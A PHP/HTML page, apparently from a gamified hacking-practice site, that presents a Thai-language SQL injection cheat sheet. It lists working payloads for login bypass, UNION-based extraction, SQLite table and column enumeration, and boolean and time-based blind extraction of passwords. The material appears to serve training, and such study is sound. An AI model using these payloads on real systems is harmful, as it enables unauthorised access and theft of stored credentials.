<?php
session_start();
if (!isset($_SESSION['player_id'])) { 
    header("Location: login_real.php"); 
    exit(); 
}
?>
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <title>Hacker King | Hacker's Handbook</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Orbitron:wght@700&family=Sarabun:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #a855f7;
            --secondary: #22d3ee;
            --warning: #fbbf24;
            --dark-bg: #020617;
            --card-bg: #0f172a;
            --border: #334155;
            --terminal-green: #4ade80;
        }

        body {
            background: var(--dark-bg);
            color: #e2e8f0;
            font-family: 'Sarabun', sans-serif;
            margin: 0;
            padding: 40px;
            line-height: 1.6;
        }

        .container { max-width: 900px; margin: 0 auto; }

        h1 {
            font-family: 'Orbitron';
            color: var(--primary);
            text-shadow: 0 0 10px var(--primary);
            border-bottom: 2px solid var(--primary);
            padding-bottom: 10px;
        }

        .category-title {
            font-family: 'Orbitron';
            color: var(--secondary);
            margin-top: 40px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .cheat-card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            transition: 0.3s;
        }

        .cheat-card:hover {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.2);
        }

        h3 { color: var(--warning); margin-top: 0; font-family: 'Fira Code'; font-size: 16px; }

        code {
            background: #000;
            color: var(--terminal-green);
            padding: 4px 8px;
            border-radius: 4px;
            font-family: 'Fira Code';
            display: block;
            margin: 10px 0;
            border-left: 3px solid var(--terminal-green);
        }

        .desc { font-size: 14px; color: #94a3b8; }

        .btn-back {
            display: inline-block;
            margin-bottom: 20px;
            color: var(--secondary);
            text-decoration: none;
            border: 1px solid var(--secondary);
            padding: 8px 15px;
            border-radius: 4px;
            font-family: 'Fira Code';
            font-size: 12px;
        }

        .btn-back:hover { background: var(--secondary); color: #000; }

        strong { color: #fff; }
    </style>
</head>
<body>

<div class="container">
    <a href="dashboard.php" class="btn-back"> < BACK_TO_DASHBOARD </a>
    
    <h1>HACKER'S_HANDBOOK.PDF</h1>
    <p class="desc">ไฟล์ฐานข้อมูลความรู้สำหรับการทำ SQL Injection (Cheat Sheet v1.0)</p>

    <h2 class="category-title">0x01: ENTRY_POINTS</h2>
    
    <div class="cheat-card">
        <h3># Auth Bypass (String)</h3>
        <p class="desc">ใช้สำหรับข้ามการล็อกอินเมื่อระบบรับ Username เป็น String</p>
        <code>' OR '1'='1' -- </code>
    </div>

    <div class="cheat-card">
        <h3># Auth Bypass (Numeric)</h3>
        <p class="desc">ใช้เมื่อ ID หรือตัวเลขถูกส่งไปยัง Query โดยตรง</p>
        <code>1 OR 1=1</code>
    </div>

    <h2 class="category-title">0x02: DATABASE_ENUMERATION</h2>
    
    <div class="cheat-card">
        <h3># Find Column Count (ORDER BY)</h3>
        <p class="desc">ใช้หาว่าตารางดั้งเดิมมีกี่ Column เพื่อให้ทำ <strong>UNION</strong> ได้ถูกต้อง</p>
        <code>' ORDER BY 1 -- </code>
        <p class="desc">ให้เปลี่ยนเลขไปเรื่อยๆ (1, 2, 3...) จนกว่าหน้าเว็บจะ Error เลขสุดท้ายที่ไม่ Error คือจำนวน Column จริง</p>
    </div>

    <div class="cheat-card">
        <h3># Union Select (Data Extraction)</h3>
        <p class="desc">ใช้ดึงข้อมูลจากตารางอื่นออกมาแสดงผล (จำนวน Column ต้องเท่ากัน)</p>
        <code>' UNION SELECT 1, 2, 3 -- </code>
    </div>

    <h2 class="category-title">0x03: SQLITE_MASTER_TABLE</h2>
    [Image showing the schema of sqlite_master table with type, name, tbl_name, and sql columns]
    <div class="cheat-card">
        <h3># Find Table Names</h3>
        <p class="desc">ใน SQLite เราสามารถดูชื่อตารางทั้งหมดได้จากระบบ</p>
        <code>' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table' -- </code>
    </div>

    <div class="cheat-card">
        <h3># Find Column Names</h3>
        <p class="desc">ใช้ดูคำสั่งที่ใช้สร้างตาราง ซึ่งจะเผยชื่อ Column ทั้งหมด</p>
        <code>' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name='users' -- </code>
    </div>

    <h2 class="category-title">0x04: BLIND_INJECTION (Advanced)</h2>
    
    <div class="cheat-card">
        <h3># Boolean Based</h3>
        <p class="desc">ใช้เมื่อหน้าเว็บไม่แสดง Error แต่แสดงผลต่างกันระหว่าง True/False</p>
        <code>' AND (SELECT SUBSTR(password,1,1) FROM users) = 'a' -- </code>
        <p class="desc">ถ้าหน้าเว็บแสดงผลปกติ แสดงว่าตัวอักษรแรกของรหัสผ่านคือ 'a'</p>
    </div>

    <div class="cheat-card">
        <h3># Time Based (SQLite)</h3>
        <p class="desc">ใช้เมื่อระบบไม่มีการตอบสนองใดๆ ต้องสั่งให้ระบบ "รอ" เพื่อยืนยันช่องโหว่</p>
        <code>' AND LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000)))) -- </code>
        <p class="desc">หมายเหตุ: ใน SQLite คำสั่งหน่วงเวลาจะใช้การประมวลผล Blob ขนาดใหญ่เพื่อให้เกิด Delay</p>
    </div>

    <div style="text-align: center; margin-top: 50px; opacity: 0.5; font-family: 'Fira Code'; font-size: 12px;">
        END_OF_DOCUMENT // HAPPY_HACKING
    </div>
</div>

</body>
</html>